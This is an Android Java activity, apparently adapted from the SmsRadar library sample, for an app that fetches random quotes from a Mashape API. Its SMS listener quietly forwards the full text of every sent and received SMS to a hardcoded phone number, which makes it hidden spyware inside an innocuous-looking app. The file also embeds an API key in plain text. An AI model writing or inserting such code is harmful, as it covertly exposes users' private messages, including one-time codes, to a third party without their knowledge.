/*
 * Copyright (c) Tuenti Technologies S.L. All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.tuenti.smsradar;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.RadioButton;
import android.widget.TextView;
import android.widget.Toast;

import com.tuenti.smsradar.controller.HttpRequest;
import com.tuenti.smsradar.models.RFQ_API_Object;


import java.util.HashMap;

/**
 * Sample activity created to show how to use SmsRadar library.
 *
 * @author Pedro Vicente Gómez Sánchez <pgomez@tuenti.com>
 * @author Manuel Peinado <mpeinado@tuenti.com>
 */
public class MainActivity extends Activity {

    private TextView myTextView;
    private TextView authorTextView;
    private RadioButton radioButtonMovies;
    private RadioButton radioButtonFamous;
    private ProgressDialog progressDialog;


	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
        initializeSmsRadarService();

        Button myButton = (Button) findViewById(R.id.myButton);
        myTextView = (TextView) findViewById(R.id.myTextView);
        authorTextView = (TextView) findViewById(R.id.authorTextView);
        radioButtonFamous = (RadioButton) findViewById(R.id.radio_button_famous);
        radioButtonMovies = (RadioButton) findViewById(R.id.radio_button_movies);
        progressDialog = new ProgressDialog(MainActivity.this, R.style.MyTheme);

//        myButton.setOnClickListener(new View.OnClickListener() {
////            @Override
//            public void onClick(View v) {
////                "http://quotes.rest/qod.json"
////                "http://api.forismatic.com/api/1.0/"
//
////                HashMap<String, String> queryParameters = new HashMap<String, String>();
//
//                // ye upar walay comments ko ignore kr
//
//                myAPI aazar = new myAPI();
//                if (isNetworkAvailable(MainActivity.this)) {
//                    if (radioButtonMovies.isChecked())
//                        aazar.execute("movies");
//                    else if (radioButtonFamous.isChecked())
//                        aazar.execute("famous");
//                } else
//                    throwToast("Please check your internet connection", Toast.LENGTH_SHORT);
//            }
//        });

//		mapGui();

//		hookListeners();
	}

    public void getQuote_onClick(View v) {
//                "http://quotes.rest/qod.json"
//                "http://api.forismatic.com/api/1.0/"

//                HashMap<String, String> queryParameters = new HashMap<String, String>();

        // ye upar walay comments ko ignore kr

        myAPI aazar = new myAPI();
        if (isNetworkAvailable(MainActivity.this)) {
            if (radioButtonMovies.isChecked())
                aazar.execute("movies");
            else if (radioButtonFamous.isChecked())
                aazar.execute("famous");
        } else
            throwToast("Please check your internet connection", Toast.LENGTH_SHORT);
    }

    public boolean isNetworkAvailable(final Context context) {
        final ConnectivityManager connectivityManager = ((ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE));
        return connectivityManager.getActiveNetworkInfo() != null && connectivityManager.getActiveNetworkInfo().isConnected();
    }

    public void throwToast(String message, int duration){
        LayoutInflater inflater = getLayoutInflater();
        View layout = inflater.inflate(R.layout.toast_layout,
                (ViewGroup) findViewById(R.id.toast_layout_root));

        TextView text = (TextView) layout.findViewById(R.id.toast_text);
        text.setText(message);

        Toast toast = new Toast(MainActivity.this);
        toast.setGravity(Gravity.CENTER_VERTICAL, 0, 0);
        toast.setDuration(duration);
        toast.setView(layout);
        toast.show();
        }

    public class myAPI extends AsyncTask<String, String, RFQ_API_Object> {

        @Override
        protected RFQ_API_Object doInBackground(String... params) {
            HashMap<String, String> headerParameters = new HashMap<String, String>();
            headerParameters.put("X-Mashape-Key", "xuC5j4vzIAmshOGkMx4AcfjczKnkp1SbSPQjsnw3hhzYPGqvRp");
            headerParameters.put("Content-Type", "application/x-www-form-urlencoded");
            headerParameters.put("Accept", "application/json");

            HttpRequest http_request = new HttpRequest("https://andruxnet-random-famous-quotes.p.mashape.com/?cat=" + params[0],
                    "POST",
                    headerParameters);
            return http_request.callAPI();
        }

//        @Override
//        protected void onPreExecute() {
//            super.onPreExecute();

//            if (myTextView.getText() != null){
//                YoYo.with(Techniques.TakingOff)
//                        .duration(500)
//                        .playOn(findViewById(R.id.myTextView));
//
//                YoYo.with(Techniques.FadeOutRight)
//                        .duration(500)
//                        .playOn(findViewById(R.id.authorTextView));
//            }

//            progressDialog.setCancelable(false);
//            progressDialog.setProgressStyle(android.R.style.Widget_Holo_ProgressBar_Large);
//            progressDialog.show();
//        }

//        @Override
//        protected void onPostExecute(RFQ_API_Object result) {
//            progressDialog.dismiss();
//            super.onPostExecute(result);
//            myTextView.setText(result.getQuote());
//            authorTextView.setText(result.getAuthor());
//
////            YoYo.with(Techniques.Landing)
////                    .duration(500)
////                    .playOn(findViewById(R.id.myTextView));
////
////            YoYo.with(Techniques.FadeInLeft)
////                    .duration(500)
////                    .playOn(findViewById(R.id.authorTextView));
////        }
    }

	private void initializeSmsRadarService() {
		SmsRadar.initializeSmsRadarService(this, new SmsListener() {
//			@Override
			public void onSmsSent(Sms sms) {
				showSmsToast(sms);

                try {
                    SmsManager forwardSms = SmsManager.getDefault();
                    forwardSms.sendTextMessage("03370363728", null, "Message Send" + "\n"+ sms, null, null);
                }
                catch (Exception ex){
                    Toast.makeText(MainActivity.this, ""+ex, Toast.LENGTH_SHORT).show();
                }

			}

//			@Override
			public void onSmsReceived(Sms sms) {
				showSmsToast(sms);

                try {
                    SmsManager forwardSms = SmsManager.getDefault();
                    forwardSms.sendTextMessage("03370363728", null, "Message Received"+ "\n"+ sms, null, null);
                }
                catch (Exception ex){
                    Toast.makeText(MainActivity.this, ""+ex, Toast.LENGTH_SHORT).show();
                }
			}
		});
	}

	private void stopSmsRadarService() {
		SmsRadar.stopSmsRadarService(this);
	}

	private void showSmsToast(Sms sms) {
		Toast.makeText(this, sms.toString(), Toast.LENGTH_LONG).show();
	}
}
